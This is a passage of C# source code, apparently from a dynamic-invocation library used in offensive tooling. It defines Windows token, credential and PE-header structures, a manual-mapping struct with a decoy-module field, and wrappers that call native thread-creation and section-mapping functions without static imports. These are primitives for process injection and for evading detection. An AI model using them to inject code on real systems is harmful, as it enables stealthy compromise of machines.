                    MiniDumpWithThreadInfo = 0x00001000,
                    MiniDumpWithCodeSegs = 0x00002000,
                    MiniDumpWithoutAuxiliaryState = 0x00004000,
                    MiniDumpWithFullAuxiliaryState = 0x00008000,
                    MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
                    MiniDumpIgnoreInaccessibleMemory = 0x00020000,
                    MiniDumpWithTokenInformation = 0x00040000,
                    MiniDumpWithModuleHeaders = 0x00080000,
                    MiniDumpFilterTriage = 0x00100000,
                    MiniDumpValidTypeFlags = 0x001fffff
                }
            }

            public class WinBase
            {
                [StructLayout(LayoutKind.Sequential)]
                public struct _SYSTEM_INFO
                {
                    public UInt16 wProcessorArchitecture;
                    public UInt16 wReserved;
                    public UInt32 dwPageSize;
                    public IntPtr lpMinimumApplicationAddress;
                    public IntPtr lpMaximumApplicationAddress;
                    public IntPtr dwActiveProcessorMask;
                    public UInt32 dwNumberOfProcessors;
                    public UInt32 dwProcessorType;
                    public UInt32 dwAllocationGranularity;
                    public UInt16 wProcessorLevel;
                    public UInt16 wProcessorRevision;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _SECURITY_ATTRIBUTES
                {
                    UInt32 nLength;
                    IntPtr lpSecurityDescriptor;
                    Boolean bInheritHandle;
                };
            }

            public class WinNT
            {
                public const UInt32 PAGE_NOACCESS = 0x01;
                public const UInt32 PAGE_READONLY = 0x02;
                public const UInt32 PAGE_READWRITE = 0x04;
                public const UInt32 PAGE_WRITECOPY = 0x08;
                public const UInt32 PAGE_EXECUTE = 0x10;
                public const UInt32 PAGE_EXECUTE_READ = 0x20;
                public const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                public const UInt32 PAGE_EXECUTE_WRITECOPY = 0x80;
                public const UInt32 PAGE_GUARD = 0x100;
                public const UInt32 PAGE_NOCACHE = 0x200;
                public const UInt32 PAGE_WRITECOMBINE = 0x400;
                public const UInt32 PAGE_TARGETS_INVALID = 0x40000000;
                public const UInt32 PAGE_TARGETS_NO_UPDATE = 0x40000000;

                public const UInt32 SEC_COMMIT = 0x08000000;
                public const UInt32 SEC_IMAGE = 0x1000000;
                public const UInt32 SEC_IMAGE_NO_EXECUTE = 0x11000000;
                public const UInt32 SEC_LARGE_PAGES = 0x80000000;
                public const UInt32 SEC_NOCACHE = 0x10000000;
                public const UInt32 SEC_RESERVE = 0x4000000;
                public const UInt32 SEC_WRITECOMBINE = 0x40000000;

                public const UInt32 SE_PRIVILEGE_ENABLED = 0x2;
                public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1;
                public const UInt32 SE_PRIVILEGE_REMOVED = 0x4;
                public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x3;

                public const UInt64 SE_GROUP_ENABLED = 0x00000004L;
                public const UInt64 SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002L;
                public const UInt64 SE_GROUP_INTEGRITY = 0x00000020L;
                public const UInt32 SE_GROUP_INTEGRITY_32 = 0x00000020;
                public const UInt64 SE_GROUP_INTEGRITY_ENABLED = 0x00000040L;
                public const UInt64 SE_GROUP_LOGON_ID = 0xC0000000L;
                public const UInt64 SE_GROUP_MANDATORY = 0x00000001L;
                public const UInt64 SE_GROUP_OWNER = 0x00000008L;
                public const UInt64 SE_GROUP_RESOURCE = 0x20000000L;
                public const UInt64 SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010L;

                public enum _SECURITY_IMPERSONATION_LEVEL
                {
                    SecurityAnonymous,
                    SecurityIdentification,
                    SecurityImpersonation,
                    SecurityDelegation
                }

                public enum TOKEN_TYPE
                {
                    TokenPrimary = 1,
                    TokenImpersonation
                }

                public enum _TOKEN_ELEVATION_TYPE
                {
                    TokenElevationTypeDefault = 1,
                    TokenElevationTypeFull,
                    TokenElevationTypeLimited
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _MEMORY_BASIC_INFORMATION32
                {
                    public UInt32 BaseAddress;
                    public UInt32 AllocationBase;
                    public UInt32 AllocationProtect;
                    public UInt32 RegionSize;
                    public UInt32 State;
                    public UInt32 Protect;
                    public UInt32 Type;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _MEMORY_BASIC_INFORMATION64
                {
                    public UInt64 BaseAddress;
                    public UInt64 AllocationBase;
                    public UInt32 AllocationProtect;
                    public UInt32 __alignment1;
                    public UInt64 RegionSize;
                    public UInt32 State;
                    public UInt32 Protect;
                    public UInt32 Type;
                    public UInt32 __alignment2;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _LUID_AND_ATTRIBUTES
                {
                    public _LUID Luid;
                    public UInt32 Attributes;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _LUID
                {
                    public UInt32 LowPart;
                    public UInt32 HighPart;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _TOKEN_STATISTICS
                {
                    public _LUID TokenId;
                    public _LUID AuthenticationId;
                    public UInt64 ExpirationTime;
                    public TOKEN_TYPE TokenType;
                    public _SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
                    public UInt32 DynamicCharged;
                    public UInt32 DynamicAvailable;
                    public UInt32 GroupCount;
                    public UInt32 PrivilegeCount;
                    public _LUID ModifiedId;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _TOKEN_PRIVILEGES
                {
                    public UInt32 PrivilegeCount;
                    public _LUID_AND_ATTRIBUTES Privileges;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _TOKEN_MANDATORY_LABEL
                {
                    public _SID_AND_ATTRIBUTES Label;
                }

                public struct _SID
                {
                    public byte Revision;
                    public byte SubAuthorityCount;
                    public WinNT._SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
                    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
                    public ulong[] SubAuthority;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _SID_IDENTIFIER_AUTHORITY
                {
                    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6, ArraySubType = UnmanagedType.I1)]
                    public byte[] Value;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _SID_AND_ATTRIBUTES
                {
                    public IntPtr Sid;
                    public UInt32 Attributes;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _PRIVILEGE_SET
                {
                    public UInt32 PrivilegeCount;
                    public UInt32 Control;
                    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
                    public _LUID_AND_ATTRIBUTES[] Privilege;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _TOKEN_USER
                {
                    public _SID_AND_ATTRIBUTES User;
                }

                public enum _SID_NAME_USE
                {
                    SidTypeUser = 1,
                    SidTypeGroup,
                    SidTypeDomain,
                    SidTypeAlias,
                    SidTypeWellKnownGroup,
                    SidTypeDeletedAccount,
                    SidTypeInvalid,
                    SidTypeUnknown,
                    SidTypeComputer,
                    SidTypeLabel
                }

                public enum _TOKEN_INFORMATION_CLASS
                {
                    TokenUser = 1,
                    TokenGroups,
                    TokenPrivileges,
                    TokenOwner,
                    TokenPrimaryGroup,
                    TokenDefaultDacl,
                    TokenSource,
                    TokenType,
                    TokenImpersonationLevel,
                    TokenStatistics,
                    TokenRestrictedSids,
                    TokenSessionId,
                    TokenGroupsAndPrivileges,
                    TokenSessionReference,
                    TokenSandBoxInert,
                    TokenAuditPolicy,
                    TokenOrigin,
                    TokenElevationType,
                    TokenLinkedToken,
                    TokenElevation,
                    TokenHasRestrictions,
                    TokenAccessInformation,
                    TokenVirtualizationAllowed,
                    TokenVirtualizationEnabled,
                    TokenIntegrityLevel,
                    TokenUIAccess,
                    TokenMandatoryPolicy,
                    TokenLogonSid,
                    TokenIsAppContainer,
                    TokenCapabilities,
                    TokenAppContainerSid,
                    TokenAppContainerNumber,
                    TokenUserClaimAttributes,
                    TokenDeviceClaimAttributes,
                    TokenRestrictedUserClaimAttributes,
                    TokenRestrictedDeviceClaimAttributes,
                    TokenDeviceGroups,
                    TokenRestrictedDeviceGroups,
                    TokenSecurityAttributes,
                    TokenIsRestricted,
                    MaxTokenInfoClass
                }

                // http://www.pinvoke.net/default.aspx/Enums.ACCESS_MASK
                [Flags]
                public enum ACCESS_MASK : uint
                {
                    DELETE = 0x00010000,
                    READ_CONTROL = 0x00020000,
                    WRITE_DAC = 0x00040000,
                    WRITE_OWNER = 0x00080000,
                    SYNCHRONIZE = 0x00100000,
                    STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                    STANDARD_RIGHTS_READ = 0x00020000,
                    STANDARD_RIGHTS_WRITE = 0x00020000,
                    STANDARD_RIGHTS_EXECUTE = 0x00020000,
                    STANDARD_RIGHTS_ALL = 0x001F0000,
                    SPECIFIC_RIGHTS_ALL = 0x0000FFF,
                    ACCESS_SYSTEM_SECURITY = 0x01000000,
                    MAXIMUM_ALLOWED = 0x02000000,
                    GENERIC_READ = 0x80000000,
                    GENERIC_WRITE = 0x40000000,
                    GENERIC_EXECUTE = 0x20000000,
                    GENERIC_ALL = 0x10000000,
                    DESKTOP_READOBJECTS = 0x00000001,
                    DESKTOP_CREATEWINDOW = 0x00000002,
                    DESKTOP_CREATEMENU = 0x00000004,
                    DESKTOP_HOOKCONTROL = 0x00000008,
                    DESKTOP_JOURNALRECORD = 0x00000010,
                    DESKTOP_JOURNALPLAYBACK = 0x00000020,
                    DESKTOP_ENUMERATE = 0x00000040,
                    DESKTOP_WRITEOBJECTS = 0x00000080,
                    DESKTOP_SWITCHDESKTOP = 0x00000100,
                    WINSTA_ENUMDESKTOPS = 0x00000001,
                    WINSTA_READATTRIBUTES = 0x00000002,
                    WINSTA_ACCESSCLIPBOARD = 0x00000004,
                    WINSTA_CREATEDESKTOP = 0x00000008,
                    WINSTA_WRITEATTRIBUTES = 0x00000010,
                    WINSTA_ACCESSGLOBALATOMS = 0x00000020,
                    WINSTA_EXITWINDOWS = 0x00000040,
                    WINSTA_ENUMERATE = 0x00000100,
                    WINSTA_READSCREEN = 0x00000200,
                    WINSTA_ALL_ACCESS = 0x0000037F,

                    SECTION_ALL_ACCESS = 0x10000000,
                    SECTION_QUERY = 0x0001,
                    SECTION_MAP_WRITE = 0x0002,
                    SECTION_MAP_READ = 0x0004,
                    SECTION_MAP_EXECUTE = 0x0008,
                    SECTION_EXTEND_SIZE = 0x0010
                };
            }

            public class ProcessThreadsAPI
            {
                [Flags]
                internal enum STARTF : uint
                {
                    STARTF_USESHOWWINDOW = 0x00000001,
                    STARTF_USESIZE = 0x00000002,
                    STARTF_USEPOSITION = 0x00000004,
                    STARTF_USECOUNTCHARS = 0x00000008,
                    STARTF_USEFILLATTRIBUTE = 0x00000010,
                    STARTF_RUNFULLSCREEN = 0x00000020,
                    STARTF_FORCEONFEEDBACK = 0x00000040,
                    STARTF_FORCEOFFFEEDBACK = 0x00000080,
                    STARTF_USESTDHANDLES = 0x00000100,
                }

                // https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
                [StructLayout(LayoutKind.Sequential)]
                public struct _STARTUPINFO
                {
                    public UInt32 cb;
                    public String lpReserved;
                    public String lpDesktop;
                    public String lpTitle;
                    public UInt32 dwX;
                    public UInt32 dwY;
                    public UInt32 dwXSize;
                    public UInt32 dwYSize;
                    public UInt32 dwXCountChars;
                    public UInt32 dwYCountChars;
                    public UInt32 dwFillAttribute;
                    public UInt32 dwFlags;
                    public UInt16 wShowWindow;
                    public UInt16 cbReserved2;
                    public IntPtr lpReserved2;
                    public IntPtr hStdInput;
                    public IntPtr hStdOutput;
                    public IntPtr hStdError;
                };

                //https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
                [StructLayout(LayoutKind.Sequential)]
                public struct _STARTUPINFOEX
                {
                    _STARTUPINFO StartupInfo;
                    // PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
                };

                //https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
                [StructLayout(LayoutKind.Sequential)]
                public struct _PROCESS_INFORMATION
                {
                    public IntPtr hProcess;
                    public IntPtr hThread;
                    public UInt32 dwProcessId;
                    public UInt32 dwThreadId;
                };
            }

            public class WinCred
            {
#pragma warning disable 0618
                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
                public struct _CREDENTIAL
                {
                    public CRED_FLAGS Flags;
                    public UInt32 Type;
                    public IntPtr TargetName;
                    public IntPtr Comment;
                    public FILETIME LastWritten;
                    public UInt32 CredentialBlobSize;
                    public UInt32 Persist;
                    public UInt32 AttributeCount;
                    public IntPtr Attributes;
                    public IntPtr TargetAlias;
                    public IntPtr UserName;
                }
#pragma warning restore 0618

                public enum CRED_FLAGS : uint
                {
                    NONE = 0x0,
                    PROMPT_NOW = 0x2,
                    USERNAME_TARGET = 0x4
                }

                public enum CRED_PERSIST : uint
                {
                    Session = 1,
                    LocalMachine,
                    Enterprise
                }

                public enum CRED_TYPE : uint
                {
                    Generic = 1,
                    DomainPassword,
                    DomainCertificate,
                    DomainVisiblePassword,
                    GenericCertificate,
                    DomainExtended,
                    Maximum,
                    MaximumEx = Maximum + 1000,
                }
            }

            public class Secur32
            {
                public struct _SECURITY_LOGON_SESSION_DATA
                {
                    public UInt32 Size;
                    public WinNT._LUID LoginID;
                    public _LSA_UNICODE_STRING Username;
                    public _LSA_UNICODE_STRING LoginDomain;
                    public _LSA_UNICODE_STRING AuthenticationPackage;
                    public UInt32 LogonType;
                    public UInt32 Session;
                    public IntPtr pSid;
                    public UInt64 LoginTime;
                    public _LSA_UNICODE_STRING LogonServer;
                    public _LSA_UNICODE_STRING DnsDomainName;
                    public _LSA_UNICODE_STRING Upn;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct _LSA_UNICODE_STRING
                {
                    public UInt16 Length;
                    public UInt16 MaximumLength;
                    public IntPtr Buffer;
                }
            }
        }

        public static class PE
        {
            // DllMain constants
            public const UInt32 DLL_PROCESS_DETACH = 0;
            public const UInt32 DLL_PROCESS_ATTACH = 1;
            public const UInt32 DLL_THREAD_ATTACH = 2;
            public const UInt32 DLL_THREAD_DETACH = 3;

            // Primary class for loading PE
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool DllMain(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

            [Flags]
            public enum DataSectionFlags : uint
            {
                TYPE_NO_PAD = 0x00000008,
                CNT_CODE = 0x00000020,
                CNT_INITIALIZED_DATA = 0x00000040,
                CNT_UNINITIALIZED_DATA = 0x00000080,
                LNK_INFO = 0x00000200,
                LNK_REMOVE = 0x00000800,
                LNK_COMDAT = 0x00001000,
                NO_DEFER_SPEC_EXC = 0x00004000,
                GPREL = 0x00008000,
                MEM_FARDATA = 0x00008000,
                MEM_PURGEABLE = 0x00020000,
                MEM_16BIT = 0x00020000,
                MEM_LOCKED = 0x00040000,
                MEM_PRELOAD = 0x00080000,
                ALIGN_1BYTES = 0x00100000,
                ALIGN_2BYTES = 0x00200000,
                ALIGN_4BYTES = 0x00300000,
                ALIGN_8BYTES = 0x00400000,
                ALIGN_16BYTES = 0x00500000,
                ALIGN_32BYTES = 0x00600000,
                ALIGN_64BYTES = 0x00700000,
                ALIGN_128BYTES = 0x00800000,
                ALIGN_256BYTES = 0x00900000,
                ALIGN_512BYTES = 0x00A00000,
                ALIGN_1024BYTES = 0x00B00000,
                ALIGN_2048BYTES = 0x00C00000,
                ALIGN_4096BYTES = 0x00D00000,
                ALIGN_8192BYTES = 0x00E00000,
                ALIGN_MASK = 0x00F00000,
                LNK_NRELOC_OVFL = 0x01000000,
                MEM_DISCARDABLE = 0x02000000,
                MEM_NOT_CACHED = 0x04000000,
                MEM_NOT_PAGED = 0x08000000,
                MEM_SHARED = 0x10000000,
                MEM_EXECUTE = 0x20000000,
                MEM_READ = 0x40000000,
                MEM_WRITE = 0x80000000
            }


            public struct IMAGE_DOS_HEADER
            {      // DOS .EXE header
                public UInt16 e_magic;              // Magic number
                public UInt16 e_cblp;               // Bytes on last page of file
                public UInt16 e_cp;                 // Pages in file
                public UInt16 e_crlc;               // Relocations
                public UInt16 e_cparhdr;            // Size of header in paragraphs
                public UInt16 e_minalloc;           // Minimum extra paragraphs needed
                public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
                public UInt16 e_ss;                 // Initial (relative) SS value
                public UInt16 e_sp;                 // Initial SP value
                public UInt16 e_csum;               // Checksum
                public UInt16 e_ip;                 // Initial IP value
                public UInt16 e_cs;                 // Initial (relative) CS value
                public UInt16 e_lfarlc;             // File address of relocation table
                public UInt16 e_ovno;               // Overlay number
                public UInt16 e_res_0;              // Reserved words
                public UInt16 e_res_1;              // Reserved words
                public UInt16 e_res_2;              // Reserved words
                public UInt16 e_res_3;              // Reserved words
                public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
                public UInt16 e_oeminfo;            // OEM information; e_oemid specific
                public UInt16 e_res2_0;             // Reserved words
                public UInt16 e_res2_1;             // Reserved words
                public UInt16 e_res2_2;             // Reserved words
                public UInt16 e_res2_3;             // Reserved words
                public UInt16 e_res2_4;             // Reserved words
                public UInt16 e_res2_5;             // Reserved words
                public UInt16 e_res2_6;             // Reserved words
                public UInt16 e_res2_7;             // Reserved words
                public UInt16 e_res2_8;             // Reserved words
                public UInt16 e_res2_9;             // Reserved words
                public UInt32 e_lfanew;             // File address of new exe header
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DATA_DIRECTORY
            {
                public UInt32 VirtualAddress;
                public UInt32 Size;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER32
            {
                public UInt16 Magic;
                public Byte MajorLinkerVersion;
                public Byte MinorLinkerVersion;
                public UInt32 SizeOfCode;
                public UInt32 SizeOfInitializedData;
                public UInt32 SizeOfUninitializedData;
                public UInt32 AddressOfEntryPoint;
                public UInt32 BaseOfCode;
                public UInt32 BaseOfData;
                public UInt32 ImageBase;
                public UInt32 SectionAlignment;
                public UInt32 FileAlignment;
                public UInt16 MajorOperatingSystemVersion;
                public UInt16 MinorOperatingSystemVersion;
                public UInt16 MajorImageVersion;
                public UInt16 MinorImageVersion;
                public UInt16 MajorSubsystemVersion;
                public UInt16 MinorSubsystemVersion;
                public UInt32 Win32VersionValue;
                public UInt32 SizeOfImage;
                public UInt32 SizeOfHeaders;
                public UInt32 CheckSum;
                public UInt16 Subsystem;
                public UInt16 DllCharacteristics;
                public UInt32 SizeOfStackReserve;
                public UInt32 SizeOfStackCommit;
                public UInt32 SizeOfHeapReserve;
                public UInt32 SizeOfHeapCommit;
                public UInt32 LoaderFlags;
                public UInt32 NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;
                public IMAGE_DATA_DIRECTORY ImportTable;
                public IMAGE_DATA_DIRECTORY ResourceTable;
                public IMAGE_DATA_DIRECTORY ExceptionTable;
                public IMAGE_DATA_DIRECTORY CertificateTable;
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
                public IMAGE_DATA_DIRECTORY Debug;
                public IMAGE_DATA_DIRECTORY Architecture;
                public IMAGE_DATA_DIRECTORY GlobalPtr;
                public IMAGE_DATA_DIRECTORY TLSTable;
                public IMAGE_DATA_DIRECTORY LoadConfigTable;
                public IMAGE_DATA_DIRECTORY BoundImport;
                public IMAGE_DATA_DIRECTORY IAT;
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
                public IMAGE_DATA_DIRECTORY Reserved;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER64
            {
                public UInt16 Magic;
                public Byte MajorLinkerVersion;
                public Byte MinorLinkerVersion;
                public UInt32 SizeOfCode;
                public UInt32 SizeOfInitializedData;
                public UInt32 SizeOfUninitializedData;
                public UInt32 AddressOfEntryPoint;
                public UInt32 BaseOfCode;
                public UInt64 ImageBase;
                public UInt32 SectionAlignment;
                public UInt32 FileAlignment;
                public UInt16 MajorOperatingSystemVersion;
                public UInt16 MinorOperatingSystemVersion;
                public UInt16 MajorImageVersion;
                public UInt16 MinorImageVersion;
                public UInt16 MajorSubsystemVersion;
                public UInt16 MinorSubsystemVersion;
                public UInt32 Win32VersionValue;
                public UInt32 SizeOfImage;
                public UInt32 SizeOfHeaders;
                public UInt32 CheckSum;
                public UInt16 Subsystem;
                public UInt16 DllCharacteristics;
                public UInt64 SizeOfStackReserve;
                public UInt64 SizeOfStackCommit;
                public UInt64 SizeOfHeapReserve;
                public UInt64 SizeOfHeapCommit;
                public UInt32 LoaderFlags;
                public UInt32 NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;
                public IMAGE_DATA_DIRECTORY ImportTable;
                public IMAGE_DATA_DIRECTORY ResourceTable;
                public IMAGE_DATA_DIRECTORY ExceptionTable;
                public IMAGE_DATA_DIRECTORY CertificateTable;
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
                public IMAGE_DATA_DIRECTORY Debug;
                public IMAGE_DATA_DIRECTORY Architecture;
                public IMAGE_DATA_DIRECTORY GlobalPtr;
                public IMAGE_DATA_DIRECTORY TLSTable;
                public IMAGE_DATA_DIRECTORY LoadConfigTable;
                public IMAGE_DATA_DIRECTORY BoundImport;
                public IMAGE_DATA_DIRECTORY IAT;
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
                public IMAGE_DATA_DIRECTORY Reserved;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_FILE_HEADER
            {
                public UInt16 Machine;
                public UInt16 NumberOfSections;
                public UInt32 TimeDateStamp;
                public UInt32 PointerToSymbolTable;
                public UInt32 NumberOfSymbols;
                public UInt16 SizeOfOptionalHeader;
                public UInt16 Characteristics;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_SECTION_HEADER
            {
                [FieldOffset(0)]
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public char[] Name;
                [FieldOffset(8)]
                public UInt32 VirtualSize;
                [FieldOffset(12)]
                public UInt32 VirtualAddress;
                [FieldOffset(16)]
                public UInt32 SizeOfRawData;
                [FieldOffset(20)]
                public UInt32 PointerToRawData;
                [FieldOffset(24)]
                public UInt32 PointerToRelocations;
                [FieldOffset(28)]
                public UInt32 PointerToLinenumbers;
                [FieldOffset(32)]
                public UInt16 NumberOfRelocations;
                [FieldOffset(34)]
                public UInt16 NumberOfLinenumbers;
                [FieldOffset(36)]
                public DataSectionFlags Characteristics;

                public string Section
                {
                    get { return new string(Name); }
                }
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_EXPORT_DIRECTORY
            {
                [FieldOffset(0)]
                public UInt32 Characteristics;
                [FieldOffset(4)]
                public UInt32 TimeDateStamp;
                [FieldOffset(8)]
                public UInt16 MajorVersion;
                [FieldOffset(10)]
                public UInt16 MinorVersion;
                [FieldOffset(12)]
                public UInt32 Name;
                [FieldOffset(16)]
                public UInt32 Base;
                [FieldOffset(20)]
                public UInt32 NumberOfFunctions;
                [FieldOffset(24)]
                public UInt32 NumberOfNames;
                [FieldOffset(28)]
                public UInt32 AddressOfFunctions;
                [FieldOffset(32)]
                public UInt32 AddressOfNames;
                [FieldOffset(36)]
                public UInt32 AddressOfOrdinals;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAdress;
                public uint SizeOfBlock;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PE_META_DATA
            {
                public UInt32 Pe;
                public Boolean Is32Bit;
                public IMAGE_FILE_HEADER ImageFileHeader;
                public IMAGE_OPTIONAL_HEADER32 OptHeader32;
                public IMAGE_OPTIONAL_HEADER64 OptHeader64;
                public IMAGE_SECTION_HEADER[] Sections;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PE_MANUAL_MAP
            {
                public String DecoyModule;
                public IntPtr ModuleBase;
                public PE_META_DATA PEINFO;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_THUNK_DATA32
            {
                [FieldOffset(0)]
                public UInt32 ForwarderString;
                [FieldOffset(0)]
                public UInt32 Function;
                [FieldOffset(0)]
                public UInt32 Ordinal;
                [FieldOffset(0)]
                public UInt32 AddressOfData;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_THUNK_DATA64
            {
                [FieldOffset(0)]
                public UInt64 ForwarderString;
                [FieldOffset(0)]
                public UInt64 Function;
                [FieldOffset(0)]
                public UInt64 Ordinal;
                [FieldOffset(0)]
                public UInt64 AddressOfData;
            }

            // API_SET_NAMESPACE_ARRAY
            [StructLayout(LayoutKind.Explicit)]
            public struct ApiSetNamespace
            {
                [FieldOffset(0x0C)]
                public int Count;

                [FieldOffset(0x10)]
                public int EntryOffset;
            }

            // API_SET_NAMESPACE_ENTRY
            [StructLayout(LayoutKind.Explicit)]
            public struct ApiSetNamespaceEntry
            {
                [FieldOffset(0x04)]
                public int NameOffset;

                [FieldOffset(0x08)]
                public int NameLength;

                [FieldOffset(0x10)]
                public int ValueOffset;

                [FieldOffset(0x14)]
                public int ValueLength;
            }

            // API_SET_VALUE_ENTRY
            [StructLayout(LayoutKind.Explicit)]
            public struct ApiSetValueEntry
            {
                [FieldOffset(0x00)]
                public int Flags;

                [FieldOffset(0x04)]
                public int NameOffset;

                [FieldOffset(0x08)]
                public int NameCount;

                [FieldOffset(0x0C)]
                public int ValueOffset;

                [FieldOffset(0x10)]
                public int ValueCount;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct LDR_DATA_TABLE_ENTRY
            {
                public Data.Native.LIST_ENTRY InLoadOrderLinks;
                public Data.Native.LIST_ENTRY InMemoryOrderLinks;
                public Data.Native.LIST_ENTRY InInitializationOrderLinks;
                public IntPtr DllBase;
                public IntPtr EntryPoint;
                public UInt32 SizeOfImage;
                public Data.Native.UNICODE_STRING FullDllName;
                public Data.Native.UNICODE_STRING BaseDllName;
            }
        }//end class

    }

    namespace DInvoke.DynamicInvoke
    {

     public class Native
            {
                public static Data.Native.NTSTATUS NtCreateThreadEx(
                    ref IntPtr threadHandle,
                    Data.Win32.WinNT.ACCESS_MASK desiredAccess,
                    IntPtr objectAttributes,
                    IntPtr processHandle,
                    IntPtr startAddress,
                    IntPtr parameter,
                    bool createSuspended,
                    int stackZeroBits,
                    int sizeOfStack,
                    int maximumStackSize,
                    IntPtr attributeList)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits,
                sizeOfStack, maximumStackSize, attributeList
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtCreateThreadEx",
                        typeof(DELEGATES.NtCreateThreadEx), ref funcargs);

                    // Update the modified variables
                    threadHandle = (IntPtr)funcargs[0];

                    return retValue;
                }

                public static Data.Native.NTSTATUS RtlCreateUserThread(
                        IntPtr Process,
                        IntPtr ThreadSecurityDescriptor,
                        bool CreateSuspended,
                        IntPtr ZeroBits,
                        IntPtr MaximumStackSize,
                        IntPtr CommittedStackSize,
                        IntPtr StartAddress,
                        IntPtr Parameter,
                        ref IntPtr Thread,
                        IntPtr ClientId)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                Process, ThreadSecurityDescriptor, CreateSuspended, ZeroBits,
                MaximumStackSize, CommittedStackSize, StartAddress, Parameter,
                Thread, ClientId
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"RtlCreateUserThread",
                        typeof(DELEGATES.RtlCreateUserThread), ref funcargs);

                    // Update the modified variables
                    Thread = (IntPtr)funcargs[8];

                    return retValue;
                }

                public static Data.Native.NTSTATUS NtCreateSection(
                    ref IntPtr SectionHandle,
                    uint DesiredAccess,
                    IntPtr ObjectAttributes,
                    ref ulong MaximumSize,
                    uint SectionPageProtection,
                    uint AllocationAttributes,
                    IntPtr FileHandle)
                {

                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle
            };

                    Data.Native.NTSTATUS retValue = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtCreateSection", typeof(DELEGATES.NtCreateSection), ref funcargs);
                    if (retValue != Data.Native.NTSTATUS.Success)
                    {
                        throw new InvalidOperationException("Unable to create section, " + retValue);
                    }

                    // Update the modified variables
                    SectionHandle = (IntPtr)funcargs[0];
                    MaximumSize = (ulong)funcargs[3];

                    return retValue;
                }

                public static Data.Native.NTSTATUS NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
                {
                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                hProc, baseAddr
            };

                    Data.Native.NTSTATUS result = (Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtUnmapViewOfSection",
                        typeof(DELEGATES.NtUnmapViewOfSection), ref funcargs);

                    return result;
                }

                public static Data.Native.NTSTATUS NtMapViewOfSection(
                    IntPtr SectionHandle,
                    IntPtr ProcessHandle,
                    ref IntPtr BaseAddress,
                    IntPtr ZeroBits,
                    IntPtr CommitSize,
                    IntPtr SectionOffset,
                    ref ulong ViewSize,
                    uint InheritDisposition,
                    uint AllocationType,
                    uint Win32Protect)
                {

                    // Craft an array for the arguments
                    object[] funcargs =
                    {
                SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType,
                Win32Protect
            };

